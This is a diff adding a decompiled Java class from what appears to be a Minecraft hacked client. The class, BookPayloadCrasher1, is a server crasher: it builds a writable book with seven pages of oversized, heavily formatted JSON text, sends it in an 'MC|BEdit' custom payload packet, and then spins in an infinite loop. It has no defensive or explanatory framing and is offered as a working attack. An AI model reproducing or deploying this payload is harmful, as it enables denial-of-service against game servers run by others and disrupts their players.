@@ -1,0 +1,41 @@
+// 
+// Decompiled by Procyon v0.6.0
+// 
+
+package me.amkgre.bettercraft.client.mods.crasher.bpc;
+
+import net.minecraft.network.Packet;
+import net.minecraft.network.play.client.CPacketCustomPayload;
+import net.minecraft.network.PacketBuffer;
+import io.netty.buffer.Unpooled;
+import net.minecraft.nbt.NBTBase;
+import net.minecraft.nbt.NBTTagString;
+import net.minecraft.nbt.NBTTagList;
+import net.minecraft.client.Minecraft;
+import net.minecraft.nbt.NBTTagCompound;
+import net.minecraft.item.ItemStack;
+import net.minecraft.init.Items;
+
+public class BookPayloadCrasher1
+{
+    public static void start() {
+        try {
+            final ItemStack bookStack = new ItemStack(Items.WRITABLE_BOOK);
+            final NBTTagCompound bookCompound = new NBTTagCompound();
+            bookCompound.setString("author", Minecraft.getMinecraft().player.getName());
+            bookCompound.setString("title", "b");
+            final NBTTagList pageList = new NBTTagList();
+            for (int page = 0; page < 7; ++page) {
+                pageList.appendTag(new NBTTagString("{\"bold\":true,\"italic\":true,\"underlined\":true,\"strikethrough\":true,\"obfuscated\":true,\"text\":\"123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\"}"));
+            }
+            bookCompound.setTag("pages", pageList);
+            bookStack.setTagCompound(bookCompound);
+            final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
+            packetBuffer.writeItemStackToBuffer(bookStack);
+            Minecraft.getMinecraft().getConnection().getNetworkManager().sendPacket(new CPacketCustomPayload("MC|BEdit", packetBuffer));
+            Thread.sleep(175L);
+            while (true) {}
+        }
+        catch (final Throwable bookStack2) {}
+    }
+}
